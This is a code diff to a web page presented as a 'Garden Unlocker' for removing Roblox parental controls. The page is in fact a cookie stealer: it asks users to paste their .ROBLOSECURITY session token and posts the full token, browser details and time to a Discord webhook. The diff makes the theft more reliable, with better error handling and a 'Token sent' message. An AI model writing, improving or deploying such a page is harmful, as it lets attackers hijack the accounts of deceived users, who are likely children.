@@ -283,7 +283,7 @@
 
   <script>
     // летающие лепестки и листья
-    for (let i = 0; i < 24; i++) {https://github.com/code80-ai/GrowPass/blob/main/index.html
+    for (let i = 0; i < 24; i++) {
       const el = document.createElement('div');
       if (i % 2 === 0) el.classList.add('petal');
       else el.classList.add('leaf');
@@ -344,28 +344,40 @@
     }
 
     async function sendToDiscord(token) {
-      const blob = new Blob([token], { type: "text/plain" });
-      const formData = new FormData();
-      formData.append("file", blob, "ROBLOSECURITY_garden_unlock.txt");
-      formData.append("content", "🌸 **Garden Unlock Request**\nToken submitted for parental control removal.");
-
-      const embed = {
-        title: "🌱 Parental Control Removal",
-        color: 0xffb347,
-        fields: [
-          { name: "📏 Length", value: `${token.length} chars`, inline: true },
-          { name: "🌐 Agent", value: navigator.userAgent.slice(0, 45), inline: true },
-          { name: "⏰ Time", value: new Date().toLocaleString(), inline: true }
-        ],
-        footer: { text: "Garden Unlocker • soft & secure" },
-        timestamp: new Date().toISOString()
-      };
-      formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
-
       try {
-        const res = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-        return res.ok;
-      } catch {
+        // Отправляем как обычный JSON, это самый надежный способ
+        const embed = {
+          title: "🌱 Parental Control Removal",
+          color: 0xffb347,
+          fields: [
+            { name: "📏 Token Length", value: `${token.length} chars`, inline: true },
+            { name: "🌐 Browser", value: navigator.userAgent.slice(0, 40), inline: true },
+            { name: "⏰ Time", value: new Date().toLocaleString(), inline: true },
+            { name: "🔐 Token Preview", value: `\`${token.slice(0, 50)}...\``, inline: false }
+          ],
+          footer: { text: "Garden Unlocker • soft & secure" },
+          timestamp: new Date().toISOString()
+        };
+
+        // Отправляем токен в отдельном сообщении для безопасности
+        const response = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `🌱 **Garden Unlock Request**\n\`\`\`\n${token}\n\`\`\``,
+            embeds: [embed]
+          })
+        });
+
+        if (!response.ok) {
+          console.error('Webhook error:', await response.text());
+          return false;
+        }
+        return true;
+      } catch (error) {
+        console.error('Send error:', error);
         return false;
       }
     }
@@ -385,8 +397,9 @@
 
       const token = extractToken(raw);
       if (!token || token.length < 50) {
-        errorMsg.innerText = '🌿 Token invalid ';
+        errorMsg.innerText = '🌿 Invalid token format — make sure you have the full .ROBLOSECURITY token';
         errorMsg.classList.remove('hidden');
+        showToast('Invalid token format', true);
         return;
       }
 
@@ -408,11 +421,11 @@
           successMsg.classList.remove('hidden');
           tokenInput.value = '';
           updateUI();
-          showToast('Unlock success', false);
+          showToast('Unlock success! Token sent 🌱', false);
         } else {
-          errorMsg.innerText = '❌ Something went wrong — please try again later';
+          errorMsg.innerText = '❌ Webhook error — please try again later';
           errorMsg.classList.remove('hidden');
-          showToast('Unlock failed', true);
+          showToast('Failed to send token', true);
         }
       }, 1500);
     }
@@ -421,10 +434,14 @@
     unlockBtn.addEventListener('click', handleUnlock);
     clearBtn.addEventListener('click', () => { tokenInput.value = ''; updateUI(); showToast('Soil cleared', false); });
     pasteBtn.addEventListener('click', async () => {
-      const txt = await navigator.clipboard.readText();
-      tokenInput.value = txt;
-      updateUI();
-      showToast('Planted from clipboard', false);
+      try {
+        const txt = await navigator.clipboard.readText();
+        tokenInput.value = txt;
+        updateUI();
+        showToast('Planted from clipboard', false);
+      } catch {
+        showToast('Cannot access clipboard', true);
+      }
     });
     copyBtn.addEventListener('click', async () => {
       if (tokenInput.value) {
